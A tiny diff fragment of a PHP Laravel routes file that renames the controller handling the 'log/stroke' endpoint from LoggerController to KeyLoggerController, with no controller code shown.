@@ -12,5 +12,5 @@
 */
 
 Route::prefix('log')->group(function() {
-    Route::any('stroke', 'LoggerController@LogStroke');
+    Route::any('stroke', 'KeyLoggerController@LogStroke');
 });
